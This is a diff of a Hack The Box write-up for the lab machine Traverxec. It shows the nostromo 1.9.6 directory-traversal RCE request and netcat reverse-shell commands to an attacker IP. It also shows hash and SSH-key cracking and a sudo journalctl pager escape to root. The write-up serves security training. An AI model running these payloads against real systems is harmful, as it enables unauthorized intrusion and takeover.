@@ -10,31 +10,31 @@ image:
   height: 400   # in pixels
 ---
 
-
 # Overview 
+
 This machine begins w/ a web enumeration, discovering that the webserver is running `nostromo 1.9.6` which is susceptible to a directory traversal that leads to RCE vulnerability due to insufficient input sanitization, allowing us to obtain a low-privilege/`www-data` user.
 
 For the privilege escalation part, we have to privilege escalate to `david` and then `root`. After enumerating the system, `nostromo` configuration file reveals that `homedirs: /home` & `homedirs_public: /public_www` is defined, meaning we have access to the home directory (`/<user>/public_www`) of users on the system through HTTP via `http://traverxec.htb/~<USER>/`. Since `david` is the only user, we know that `/home/david/public_www` exists, `public_www` directory contains a backup of `david` encrypted SSH private key, after cracking it w/ `john`, we are able to SSH into `david` by specifying his SSH private key.
 
 On user `david`'s home directory, there is a script that reveals that user `david` is allowed to execute `/usr/bin/journalctl -n5 -unostromo.service` as root. `journalctl` has a GTFOBins entry, allowing us to privilege escalate to `root` w/ `!/bin/sh`.
 
-
 ---
 
-| Column       | Details      |
-| ------------ | ------------ |
-| Box Name     | Traverxec    |
-| IP           | 10.10.10.165 |
-| Points       | 20           |
-| Difficulty   |    Easy          |
-| Creator      |    [jkr](https://www.hackthebox.com/home/users/profile/77141)           |
-| Release Date | 16 Nov 2019             |
-
+| Column       | Details                                                    |
+|--------------|------------------------------------------------------------|
+| Box Name     | Traverxec                                                  |
+| IP           | 10.10.10.165                                               |
+| Points       | 20                                                         |
+| Difficulty   | Easy                                                       |
+| Creator      | [jkr](https://www.hackthebox.com/home/users/profile/77141) |
+| Release Date | 16 Nov 2019                                                |
 
 # Recon
 
 ## TCP/80 (HTTP)
+
 - FFUF
+
 	```bash
 	                        [Status: 200, Size: 15674, Words: 3910, Lines: 401, Duration: 39ms]
 	css                     [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 36ms]
@@ -46,26 +46,32 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	:: Progress: [4615/4615] :: Job [1/1] :: 54 req/sec :: Duration: [0:04:41] :: Errors: 285 ::
 	```
 
-
-
 # Initial Foothold
 
 ## TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE
+
 1. Found out that `nostromo 1.9.6/nhttpd 1.9.6` webserver is running
 	![](Pasted%20image%2020220925014140.png)
 2. Search exploits for `nostromo 1.9.6`
 	
+
 	| Exploit Title                                                        | Path                     |
+
 	| -------------------------------------------------------------------- | ------------------------ |
+
 	| Nostromo - Directory Traversal Remote Command Execution (Metasploit) | multiple/remote/47573.rb |
+
 	| nostromo 1.9.6 - Remote Code Execution                               | multiple/remote/47837.py |
+
 	| nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | linux/remote/35466.sh    |
+
 3. How does `nostromo 1.9.6 - Remote Code Execution` - (`multiple/remote/47837.py`) work?
 	- Due to the lack of input sanitization, there is a directory traversal vulnerability in the function `http_verify`, attackers can include `/bin/sh` to do remote code execution.
 	- Carriage returns (`\r, %0d`) is used to bypass the input sanitization of `/../` (Directory Traversal), allowing attackers to include `/bin/sh` to execude code.
 	- [More Info](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html)
 4. Try `nostromo 1.9.6 - Remote Code Execution` - (`multiple/remote/47837.py`)
 	1. Run exploit
+
 		```
 		┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
 		└─# python2 47837.py traverxec.htb 80 'id;whoami'
@@ -79,7 +85,9 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 		uid=33(www-data) gid=33(www-data) groups=33(www-data)
 		www-data
 		```
+
 	2. Start `netcat` listener
+
 		```
 		┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
 		└─# nc -nvlp 4444
@@ -87,20 +95,24 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 		Ncat: Listening on :::4444
 		Ncat: Listening on 0.0.0.0:4444
 		```
+
 	3. Invoke reverse shell
+
 		```
 		┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
 		└─# python2 47837.py traverxec.htb 80 'nc 10.10.14.14 4444 -e /bin/bash'
 		```
+
 		![](Pasted%20image%2020220925015312.png)
 
-
 ## TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE (Manual)
+
 1. How does `nostromo 1.9.6 - Remote Code Execution` work?
 	- Due to the insufficient  input sanitization, there is a directory traversal vulnerability in the function `http_verify`, attackers can include `/bin/sh` to do remote code execution.
 	- Carriage returns (`\r, %0d`) is used to bypass the input sanitization of `/../` (Directory Traversal), allowing attackers to include `/bin/sh` to execude code.
 	- [More Info](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html)
 2. Check if RCE is working
+
 	```
 	POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
 	Host: 10.10.10.165
@@ -114,10 +126,14 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	echo
 	bash -c "id;whoami" | nc 10.10.14.14 4444
 	```
+
 	![](Pasted%20image%2020220925170508.png)
+
 	>Executed code is not reflected on the webpage, we have to pip `|` the executed commands into `netcat` to view it.
 	{: .prompt-info }
-2. Start `netcat` listener
+
+3. Start `netcat` listener
+
 	```
 	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
 	└─# nc -nvlp 4444
@@ -126,7 +142,9 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	Ncat: Listening on 0.0.0.0:4444
 	Ncat: Connection from 10.10.10.165.
 	```
-3. Invoke reverse shell
+
+4. Invoke reverse shell
+
 	```
 	POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
 	Host: 10.10.10.165
@@ -140,13 +158,15 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	echo
 	bash -c "nc 10.10.14.14 4444 -e /bin/bash" 
 	```
-4. Demo - nostromo 1.9.6 RCE
+
+5. Demo - nostromo 1.9.6 RCE
 	![](19CaxMPgGy.gif)
 
-
 ## TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE (Metasploit)
+
 1. Launch `msfconsole`
 2. Search for `nhttpd`
+
 	```
 	msf6 > search nhttpd
 	
@@ -156,14 +176,18 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	[*] Using configured payload cmd/unix/reverse_perl
 	msf6 exploit(multi/http/nostromo_code_exec) >
 	```
+
 3. Set `OPTIONS`
+
 	```
 	msf6 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
 	RHOSTS => 10.10.10.165
 	msf6 exploit(multi/http/nostromo_code_exec) > set LHOST tun0
 	LHOST => 10.10.14.14
 	```
+
 4. Exploit!
+
 	```
 	msf6 exploit(multi/http/nostromo_code_exec) > exploit
 	
@@ -185,20 +209,23 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	uid=33(www-data) gid=33(www-data) groups=33(www-data)
 	www-data@traverxec:/usr/bin$
 	```
+
 	![](Pasted%20image%2020220925054440.png)
-
-
 
 # Privilege Escalation
 
 ## David - Enumeration
+
 1. Find out the location of the root web directory
+
 	```
 	www-data@traverxec:/var/nostromo/conf$ find / 2>/dev/null | grep "portfolio_01.jpg"
 	/var/nostromo/htdocs/img/portfolio/portfolio_01.jpg
 	```
+
 	- `/var/nostromos`
 2. View files in `/var/nostromos`
+
 	```
 	www-data@traverxec:/var/nostromo$ ls -la
 	total 24
@@ -209,8 +236,10 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	drwxr-xr-x  2 root     daemon 4096 Oct 25  2019 icons
 	drwxr-xr-x  2 www-data daemon 4096 Sep 24 12:57 logs
 	```
+
 	- `conf` - contains `nostromos` configurations
 3. View `conf/nhttpd.conf`
+
 	```
 	www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
 	# MAIN [MANDATORY]
@@ -245,24 +274,34 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	homedirs                /home
 	homedirs_public         public_www
 	```
+
 	- `/var/nostromo/conf/.htpasswd`
+
 		>  Contains basic authentication credentials
 		{: .prompt-info }
+
 	- `homedirs: /home`
+
 		>  When `homedirs` is defined, the public can access the home directory of users on the system
 		>  Proceed to `http://example.com/~<Name Of User>/` to access the home directory of the specified user 
 		{: .prompt-info }
+
 	- `homedirs_public: public_www`
+
 		>  `public_www` is a directory that exists in the user's directory
 		>   When `homedirs_public` is defined, the public can only access `public_www` directory, instead of the entire home directory
 		{: .prompt-info }
+
 	- [Source](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD#BASIC_AUTHENTICATION)
 4. Extract Hash in `.htpasswd`
+
 	```
 	www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd | cut -d ":" -f2
 	$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 	```
+
 5. Found `.htpasswd` w/ `linpeas.sh` as well
+
 	```
 	╔══════════╣ Analyzing Htpasswd Files (limit 70)
 	-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
@@ -270,7 +309,9 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	```
 
 ## David - Crack Hash
+
 1. Identify the hash alogrithm
+
 	```
 	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
 	└─# nth --no-banner --file hash
@@ -282,17 +323,22 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	Cisco-IOS(MD5), HC: 500 JtR: md5crypt
 	FreeBSD MD5, HC: 500 JtR: md5crypt
 	```
+
 2. Crack hash w/ `hashcat`
+
 	```
 	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit]
 	└─# hashcat -a 0 -m 500 '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' /usr/share/wordlists/rockyou.txt --show
 	$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
 	```
+
 	- It took really long
 3. Could not switch to `david` w/ `Nowonly4me`
 
 ## David - Found Backup SSH Keys
+
 1. View files in `/home/david/public_www`
+
 	```
 	www-data@traverxec:/home/david/public_www$ find .
 	.
@@ -302,8 +348,10 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	./protected-file-area/.htaccess
 	www-data@traverxec:/home/david/public_www$
 	```
+
 	- `backup-ssh-identity-files.tgz`
 2. Copy `backup-ssh` to `/tmp` & extract it
+
 	```
 	www-data@traverxec:/tmp$ cp backup-ssh-identity-files.tgz /tmp
 	
@@ -314,7 +362,9 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	home/david/.ssh/id_rsa.pub
 	www-data@traverxec:/tmp$
 	```
-4. Decrypt encrypted `id_rsa`
+
+3. Decrypt encrypted `id_rsa`
+
 	```
 	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/loot]
 	└─# ssh2john id_rsa > john_id_rsa
@@ -329,7 +379,9 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	Press 'q' or Ctrl-C to abort, almost any other key for status
 	hunter           (id_rsa)
 	```
-5. SSH w/ `id_rsa` & `hunter`
+
+4. SSH w/ `id_rsa` & `hunter`
+
 	```
 	┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/loot]
 	└─# sshpass -P 'Enter passphrase' -p 'hunter' ssh -i id_rsa david@traverxec.htb
@@ -338,9 +390,10 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	david@traverxec:~$
 	```
 
-
 ##  Root - Enumeration
+
 1. Found a script in `david`'s home directory
+
 	```
 	david@traverxec:~/bin$ ls -la
 	total 16
@@ -349,7 +402,9 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	-r-------- 1 david david  802 Oct 25  2019 server-stats.head
 	-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
 	```
+
 2. View contents of `server-stats.sh`
+
 	```
 	david@traverxec:~/bin$ cat server-stats.sh
 	#!/bin/bash
@@ -363,9 +418,11 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	echo "Last 5 journal log lines:"
 	/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
 	```
+
 	- `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`
 	- `/usr/bin/journalctl` - has a [GTFOBins entry](https://gtfobins.github.io/gtfobins/journalctl/#sudo)
 3. Execute `server-stats.sh`, there is no password prompt, this means that `david` is able to run `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` as `root`.
+
 	```
 	david@traverxec:~/bin$ ./server-stats.sh
 	Load:  17:31:48 up  2:35,  1 user,  load average: 0.00, 0.00, 0.00
@@ -383,6 +440,7 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 	```
 
 ## Root - SUDO GTFOBINS
+
 1. How do we exploit `journalctl`
 	- `journalctl` invokes the default pager, likely to be `less`. 
 	- However, `-n5` is option is used, meaning only 5 lines will be displayed, since there is sufficient screen space, `less` will not be invoked.
@@ -390,9 +448,12 @@ On user `david`'s home directory, there is a script that reveals that user `davi
 2. Exploit `journalctl`
 	1. Make terminal as small as possible
 	2. Spawn `root` shell
+
 		```
 		/bin/sh
 		```
+
 		![](Pasted%20image%2020220925051459.png)
-1. Demo `SUDO GTFOBINS journalctl`
+
+3. Demo `SUDO GTFOBINS journalctl`
 	![](KqccceU2oq.gif)
